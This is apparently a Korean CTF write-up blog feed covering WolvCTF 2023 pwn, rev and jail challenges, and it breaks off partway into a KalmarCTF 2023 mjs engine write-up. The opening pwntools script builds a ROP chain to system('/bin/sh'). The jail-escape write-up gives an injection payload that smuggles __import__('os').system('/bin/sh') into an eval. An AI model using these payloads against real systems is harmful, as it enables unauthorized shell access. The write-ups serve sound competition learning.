class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x117</span> + <span class="string">b&#x27;b&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;\x4c&#x27;</span></span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&#x27;2\n&#x27;</span>, <span class="built_in">str</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line">pie_leak = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">e.address = pie_leak - <span class="number">0x124C</span></span><br><span class="line">info(<span class="built_in">hex</span>(pie_leak))</span><br><span class="line">info(<span class="built_in">hex</span>(e.address))</span><br><span class="line"></span><br><span class="line"><span class="comment"># no pop rdi</span></span><br><span class="line"><span class="comment"># no libc address in stack</span></span><br><span class="line"><span class="comment"># $rdi   : 0x007ffdd808f940  →  0x007ff4dec620d0  →  &lt;funlockfile+0&gt; endbr64</span></span><br><span class="line">ret = e.address + <span class="number">0x101a</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x117</span> + <span class="string">b&#x27;b&#x27;</span></span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(e.sym[<span class="string">&#x27;printf&#x27;</span>])</span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(e.sym[<span class="string">&#x27;main&#x27;</span>])</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&#x27;2\n&#x27;</span>, <span class="built_in">str</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line">pause()</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">libc_leak = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc.address = libc_leak - <span class="number">0x620d0</span></span><br><span class="line">info(<span class="built_in">hex</span>(libc_leak))</span><br><span class="line">info(<span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line">pop_rdi = libc.address + <span class="number">0x2a3e5</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x117</span> + <span class="string">b&#x27;b&#x27;</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)))</span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(libc.sym[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&#x27;2\n&#x27;</span>, <span class="built_in">str</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line">pause()</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wctf&#123;w3l1_m4yb3_th4t_w45_a_b4d_id3a&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Wolve </category>
          
      </categories>
      
      
        <tags>
            
            <tag> medium/hard </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WolvCTF 2023 - child-re (rev)</title>
      <link href="/230321-wolvctf2023-childre/"/>
      <url>/230321-wolvctf2023-childre/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1866">https://ctftime.org/event/1866</a></li></ul><blockquote><p>You’ve graduated from baby, congrats!</p></blockquote><ul><li>[141 solves &#x2F; 100 points]</li></ul><p>리버싱 문제에서 솔브가 가장 많아서 도전해봤다.</p><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>main을 살펴보면 플래그는 어디엔가 있다고 한다. 문자열 검색으로는 보이지 않고 함수 목록을 살펴보면 아래와 같은 함수가 보인다.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sub_1165</span><span class="params">(<span class="type">char</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v2[<span class="number">43</span>]; <span class="comment">// [rsp+10h] [rbp-60h] BYREF</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">42</span>]; <span class="comment">// [rsp+40h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v4; <span class="comment">// [rsp+6Ah] [rbp-6h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+6Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">strcpy</span>(v2, <span class="string">&quot;]I^LQb\x1B^IBB\x1BA\x19X\x1Fum_\x1BN\x19u^\x1Au^B\x19um\x1EF\x1ERS\v\vu\x1E\x18W&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">41</span>; ++i )</span><br><span class="line">    s[i] = a1 ^ v2[i];</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>원래 <code>strcpy</code>가 보이지 않았는데 변수들 자료형이나 배열 크기를 조절해주니까 보였다. 뭔가 <code>puts</code> 함수를 통해 flag를 출력해준다고 생각해서 저 함수만 따로 실행시켜보기로 했다.</p><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><p>아래와 같이 코드를 작성해주고 컴파일 후 실행하면..</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*char v2[43]; // [rsp+10h] [rbp-60h] BYREF*/</span></span><br><span class="line"><span class="type">char</span>* v2;</span><br><span class="line"><span class="type">char</span> s[<span class="number">42</span>]; <span class="comment">// [rsp+40h] [rbp-30h] BYREF</span></span><br><span class="line"><span class="type">char</span> v4; <span class="comment">// [rsp+6Ah] [rbp-6h]</span></span><br><span class="line"><span class="type">int</span> i; <span class="comment">// [rsp+6Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="comment">/*memset(s, 0, sizeof(s));*/</span></span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  v2 = <span class="string">&quot;]I^LQb\x1B^IBB\x1B\x41\x19X\x1Fum_\x1BN\x19u^\x1Au^B\x19um\x1E\x46\x1ERS\v\vu\x1E\x18W&quot;</span>;</span><br><span class="line">  <span class="type">char</span> a1 = <span class="number">42</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">41</span>; ++i )</span><br><span class="line">    s[i] = a1 ^ v2[i];</span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>flag가 짠! 하고 나온다.</p><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wctf&#123;H1tchh1k3r5_Gu1d3_t0_th3_G4l4xy!!_42&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Wolve </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> jail </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WolvCTF 2023 - Homework Help (rev)</title>
      <link href="/230321-wolvctf2023-homeworkhelp/"/>
      <url>/230321-wolvctf2023-homeworkhelp/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1866">https://ctftime.org/event/1866</a></li></ul><blockquote><p>I wrote a program to solve my math homework so I could find flags. Unfortunatly my program sucks at math and just makes me do it. It does find flags though</p></blockquote><ul><li>[93 solves &#x2F; 265 points]</li></ul><p>리버싱 문제에서 두! 번째로 솔브가 많아서 도전해봤다.</p><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>분석하다보면 조금 어이없는데(?) 결국 분석해야할 함수는 하나다. <code>_stack_chk_fail</code> 함수이다. 함수명이 헷갈려서 IDA도 분석을 제대로 못해서 분석해야할 함수를 직관적으로 찾지 못했다. 이런 경우는 어셈블리를 직접 확인해야 정확하게 분석할 수 있다.</p><p>아무든 분석해야할 로직은 아래와 같다.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">idx = <span class="number">0LL</span>;</span><br><span class="line"><span class="keyword">for</span> ( i = <span class="number">0x41</span>; ; i = v3[idx + <span class="number">1</span>] )</span><br><span class="line">&#123;</span><br><span class="line">  v3[<span class="number">0</span>] ^= i;</span><br><span class="line">  <span class="keyword">if</span> ( FLAG[idx] != v3[<span class="number">0</span>] )</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">if</span> ( ++idx == <span class="string">&#x27; &#x27;</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Well Done.&quot;</span>);</span><br><span class="line">    <span class="keyword">goto</span> LABEL_7;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>break</code> 되지 않으면 flag를 출력해준다. 이를 python으로 다시 재구현했다. 이때 <code>v3</code> 변수가 헷갈리게 아래처럼 정의되어 있어서 주의하자.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">v3[<span class="number">2</span>] = <span class="number">0x14</span>;</span><br><span class="line">*&amp;v3[<span class="number">3</span>] = <span class="number">0x1200000017</span>LL;</span><br><span class="line">*&amp;v3[<span class="number">5</span>] = <span class="number">0x500000001D</span>LL;</span><br><span class="line">*&amp;v3[<span class="number">7</span>] = <span class="number">0x5D00000046</span>LL;</span><br><span class="line">*&amp;v3[<span class="number">9</span>] = <span class="number">0x4100000042</span>LL;</span><br><span class="line">*&amp;v3[<span class="number">11</span>] = <span class="number">0x330000006C</span>LL;</span><br><span class="line">*&amp;v3[<span class="number">13</span>] = <span class="number">0x5A0000005D</span>LL;</span><br><span class="line">*&amp;v3[<span class="number">15</span>] = <span class="number">0x3A0000000E</span>LL;</span><br><span class="line">*&amp;v3[<span class="number">17</span>] = <span class="number">0x410000006A</span>LL;</span><br><span class="line">*&amp;v3[<span class="number">19</span>] = <span class="number">0x5700000040</span>LL;</span><br><span class="line">*&amp;v3[<span class="number">21</span>] = <span class="number">0x3400000008</span>LL;</span><br><span class="line">*&amp;v3[<span class="number">23</span>] = <span class="number">0xB0000003C</span>LL;</span><br><span class="line">*&amp;v3[<span class="number">25</span>] = <span class="number">0x3400000003</span>LL;</span><br><span class="line">*&amp;v3[<span class="number">27</span>] = <span class="number">0x4600000028</span>LL;</span><br><span class="line">*&amp;v3[<span class="number">29</span>] = <span class="number">0x530000005F</span>LL;</span><br><span class="line">*&amp;v3[<span class="number">31</span>] = <span class="number">0x5000000010</span>LL;</span><br><span class="line">v3[<span class="number">0</span>] = <span class="number">0x36</span>;</span><br></pre></td></tr></table></figure><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">arr = [</span><br><span class="line">    <span class="number">0x1400000036</span>,</span><br><span class="line">    <span class="number">0x1200000017</span>,</span><br><span class="line">    <span class="number">0x500000001D</span>,</span><br><span class="line">    <span class="number">0x5D00000046</span>,</span><br><span class="line">    <span class="number">0x4100000042</span>,</span><br><span class="line">    <span class="number">0x330000006C</span>,</span><br><span class="line">    <span class="number">0x5A0000005D</span>,</span><br><span class="line">    <span class="number">0x3A0000000E</span>,</span><br><span class="line">    <span class="number">0x410000006A</span>,</span><br><span class="line">    <span class="number">0x5700000040</span>,</span><br><span class="line">    <span class="number">0x3400000008</span>,</span><br><span class="line">    <span class="number">0x0B0000003C</span>,</span><br><span class="line">    <span class="number">0x3400000003</span>,</span><br><span class="line">    <span class="number">0x4600000028</span>,</span><br><span class="line">    <span class="number">0x530000005F</span>,</span><br><span class="line">    <span class="number">0x5000000010</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">arr2 = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> arr:</span><br><span class="line">    arr2.append(i &amp; <span class="number">0xffffffff</span>)</span><br><span class="line">    arr2.append(i &gt;&gt; <span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">current = arr2[<span class="number">0</span>] ^ <span class="number">0x41</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">chr</span>(current), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(arr2)):</span><br><span class="line">    current = current ^ arr2[i]</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(current), end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>첫 번째 반복문일 경우만 <code>0x41</code>을 xor 했으니 그 경우만 먼저 처리해주고 그 다음부터는 1부터 1씩 올려가면서 xor를 처리해주면 된다.</p><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wctf&#123;+m0r3_l1ke_5t4ck_chk_w1n=-&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Wolve </category>
          
      </categories>
      
      
        <tags>
            
            <tag> easy/medium </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WolvCTF 2023 - escaped (jail escape)</title>
      <link href="/230320-wolvctf2023-escaped/"/>
      <url>/230320-wolvctf2023-escaped/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1866">https://ctftime.org/event/1866</a></li></ul><blockquote><p>nya<br><code>nc escaped.wolvctf.io 1337</code></p></blockquote><ul><li>[54 solves &#x2F; 50 points]</li></ul><p>jail escape라고도 하고 jail break라고도 하는 듯</p><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>문제에서 주어진 python 코드를 살펴보자.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Welcome to my `cat` program. Give me a string and I&#x27;ll output it back.&quot;</span>)</span><br><span class="line">code = <span class="built_in">input</span>(<span class="string">&quot;Enter your string (with double quotes) &gt;&gt;&gt; &quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> ast</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> code[<span class="number">0</span>] == <span class="string">&#x27;&quot;&#x27;</span> <span class="keyword">and</span> code[-<span class="number">1</span>] == <span class="string">&#x27;&quot;&#x27;</span> <span class="keyword">and</span> <span class="built_in">all</span>(ch != <span class="string">&#x27;&quot;&#x27;</span> <span class="keyword">for</span> ch <span class="keyword">in</span> code[<span class="number">1</span>:-<span class="number">1</span>]):</span><br><span class="line">  compiled = <span class="built_in">compile</span>(<span class="string">&#x27;print(&quot;&#x27;</span> + <span class="built_in">eval</span>(code) + <span class="string">&#x27;&quot;)&#x27;</span>, <span class="string">&quot;out&quot;</span>, mode = <span class="string">&quot;exec&quot;</span>)</span><br><span class="line">  <span class="built_in">exec</span>(compiled)</span><br></pre></td></tr></table></figure><p>“”으로 감싸서 입력을 보내면 print 함수를 이용해서 출력해준다. 이때 주의해야할 점은 “와 “ 사이에 “가 또 들어가면 안된다.</p><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><p>약간 커맨드 인젝션 하는 느낌으로 다가가보자.<br><code>&quot;</code>의 아스키 코드인 <code>\x22</code>을 이용하여 <code>print(&quot;&quot;)</code>을 만들어주고 <code>;</code>을 이용해서 명령어를 하나 더 실행시키면 된다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; print(&quot;a&quot;);print(&quot;b&quot;)</span><br><span class="line">a</span><br><span class="line">b</span><br></pre></td></tr></table></figure><p>중요한 점은 페이로드를 보낼 때 <code>&quot;</code>와 <code>&quot;</code>으로 감싸야 한다.</p><h3 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;\x22);__import__(&#x27;os&#x27;).system(&#x27;/bin/sh&#x27;)#&quot;</span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wctf&#123;m30w_uwu_:3&#125;</span><br></pre></td></tr></table></figure><img src="/images/230320-wolvctf2023-escaped/Screenshot 2023-03-29 at 16.32.27.png" width=600/><br>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Wolve </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> jail </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>KalmarCTF 2023 - mjs (JS Engine, OOB)</title>
      <link href="/230318-kalmarctf2023-mjs/"/>
      <url>/230318-kalmarctf2023-mjs/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1878">https://ctftime.org/event/1878</a></li></ul><blockquote><p>Toddler’s first browser exploitation: <a href="https://github.com/cesanta/mjs">https://github.com/cesanta/mjs</a><br><code>nc 54.93.211.13 10002</code><br><code>clone</code>, <code>pwn</code>, <code>warmup</code></p></blockquote><ul><li>[52 solves &#x2F; 100 points]</li></ul><p>처음으로 포너블에 나온 자바스크립트 엔진 문제를 완주했다..! 풀이를 두 가지 소개한다. 첫 번째 풀이는 내가 풀이한 방식이고 두 번째는 친구가 풀이한 방식이다. 친구 풀이 보면서 많이 공부할 수 있었다.</p><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>이 문제는 description에 포함된 mjs 레포를 참고해서 분석을 해야한다. 문제에서는 브라우저 익스라고 표현했지만 레포에 들어가서 Overview를 읽어보면 브라우저에 실제로 쓰이는 엔진인지는 잘 모르겠다..ㅎ IoT 기기에서 볼 수 있을 것 같다.</p><p>아무튼 이 문제에서 diff.patch 파일을 제공해줬는데 살펴보자. </p><figure class="highlight patch"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">diff --git a/Makefile b/Makefile</span></span><br><span class="line"><span class="comment">index d265d7e..d495e84 100644</span></span><br><span class="line"><span class="comment">--- a/Makefile</span></span><br><span class="line"><span class="comment">+++ b/Makefile</span></span><br><span class="line"><span class="meta">@@ -5,6 +5,7 @@</span> BUILD_DIR = build</span><br><span class="line"> RD ?= docker run -v $(CURDIR):$(CURDIR) --user=$(shell id -u):$(shell id -g) -w $(CURDIR)</span><br><span class="line"> DOCKER_GCC ?= $(RD) mgos/gcc</span><br><span class="line"> DOCKER_CLANG ?= $(RD) mgos/clang</span><br><span class="line"><span class="addition">+CC = clang</span></span><br><span class="line"> </span><br><span class="line"> include $(SRCPATH)/mjs_sources.mk</span><br><span class="line"> </span><br><span class="line"><span class="meta">@@ -81,7 +82,7 @@</span> CFLAGS += $(COMMON_CFLAGS)</span><br><span class="line"> # NOTE: we compile straight from sources, not from the single amalgamated file,</span><br><span class="line"> # in order to make sure that all sources include the right headers</span><br><span class="line"> $(PROG): $(TOP_MJS_SOURCES) $(TOP_COMMON_SOURCES) $(TOP_HEADERS) $(BUILD_DIR)</span><br><span class="line"><span class="deletion">-$(DOCKER_CLANG) clang $(CFLAGS) $(TOP_MJS_SOURCES) $(TOP_COMMON_SOURCES) -o $(PROG)</span></span><br><span class="line"><span class="addition">+$(CC) $(CFLAGS) $(TOP_MJS_SOURCES) $(TOP_COMMON_SOURCES) -o $(PROG)</span></span><br><span class="line"> </span><br><span class="line"> $(BUILD_DIR):</span><br><span class="line"> mkdir -p $@</span><br><span class="line"><span class="comment">diff --git a/src/mjs_builtin.c b/src/mjs_builtin.c</span></span><br><span class="line"><span class="comment">index 6f51e08..36c2b43 100644</span></span><br><span class="line"><span class="comment">--- a/src/mjs_builtin.c</span></span><br><span class="line"><span class="comment">+++ b/src/mjs_builtin.c</span></span><br><span class="line"><span class="meta">@@ -137,12 +137,12 @@</span> void mjs_init_builtin(struct mjs *mjs, mjs_val_t obj) &#123;</span><br><span class="line">           mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_load));</span><br><span class="line">   mjs_set(mjs, obj, &quot;print&quot;, ~0,</span><br><span class="line">           mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_print));</span><br><span class="line"><span class="deletion">-  mjs_set(mjs, obj, &quot;ffi&quot;, ~0,</span></span><br><span class="line"><span class="deletion">-          mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_ffi_call));</span></span><br><span class="line"><span class="deletion">-  mjs_set(mjs, obj, &quot;ffi_cb_free&quot;, ~0,</span></span><br><span class="line"><span class="deletion">-          mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_ffi_cb_free));</span></span><br><span class="line"><span class="deletion">-  mjs_set(mjs, obj, &quot;mkstr&quot;, ~0,</span></span><br><span class="line"><span class="deletion">-          mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_mkstr));</span></span><br><span class="line"><span class="addition">+  /* mjs_set(mjs, obj, &quot;ffi&quot;, ~0, */</span></span><br><span class="line"><span class="addition">+  /*         mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_ffi_call)); */</span></span><br><span class="line"><span class="addition">+  /* mjs_set(mjs, obj, &quot;ffi_cb_free&quot;, ~0, */</span></span><br><span class="line"><span class="addition">+  /*         mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_ffi_cb_free)); */</span></span><br><span class="line"><span class="addition">+  /* mjs_set(mjs, obj, &quot;mkstr&quot;, ~0, */</span></span><br><span class="line"><span class="addition">+  /*         mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_mkstr)); */</span></span><br><span class="line">   mjs_set(mjs, obj, &quot;getMJS&quot;, ~0,</span><br><span class="line">           mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_get_mjs));</span><br><span class="line">   mjs_set(mjs, obj, &quot;die&quot;, ~0,</span><br><span class="line"><span class="meta">@@ -151,8 +151,8 @@</span> void mjs_init_builtin(struct mjs *mjs, mjs_val_t obj) &#123;</span><br><span class="line">           mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_do_gc));</span><br><span class="line">   mjs_set(mjs, obj, &quot;chr&quot;, ~0,</span><br><span class="line">           mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_chr));</span><br><span class="line"><span class="deletion">-  mjs_set(mjs, obj, &quot;s2o&quot;, ~0,</span></span><br><span class="line"><span class="deletion">-          mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_s2o));</span></span><br><span class="line"><span class="addition">+  /* mjs_set(mjs, obj, &quot;s2o&quot;, ~0, */</span></span><br><span class="line"><span class="addition">+  /*         mjs_mk_foreign_func(mjs, (mjs_func_ptr_t) mjs_s2o)); */</span></span><br><span class="line"> </span><br><span class="line">   /*</span><br><span class="line">    * Populate JSON.parse() and JSON.stringify()</span><br><span class="line"><span class="comment">diff --git a/src/mjs_exec.c b/src/mjs_exec.c</span></span><br><span class="line"><span class="comment">index bd48fea..24c2c7c 100644</span></span><br><span class="line"><span class="comment">--- a/src/mjs_exec.c</span></span><br><span class="line"><span class="comment">+++ b/src/mjs_exec.c</span></span><br><span class="line"><span class="meta">@@ -835,7 +835,7 @@</span> MJS_PRIVATE mjs_err_t mjs_execute(struct mjs *mjs, size_t off, mjs_val_t *res) &#123;</span><br><span class="line"> </span><br><span class="line">           *func = MJS_UNDEFINED;  // Return value</span><br><span class="line">           // LOG(LL_VERBOSE_DEBUG, (&quot;CALLING  %d&quot;, i + 1));</span><br><span class="line"><span class="deletion">-        &#125; else if (mjs_is_string(*func) || mjs_is_ffi_sig(*func)) &#123;</span></span><br><span class="line"><span class="addition">+        &#125; else if (mjs_is_ffi_sig(*func)) &#123;</span></span><br><span class="line">           /* Call ffi-ed function */</span><br><span class="line"> </span><br><span class="line">           call_stack_push_frame(mjs, bp.start_idx + i, retval_stack_idx);</span><br></pre></td></tr></table></figure><p>Built-in API에서 <code>ffi</code>, <code>ffi_cb_free</code>, <code>mkstr</code> 기능을 지웠다고 이해했다. 지워진 기능들 중 하나인 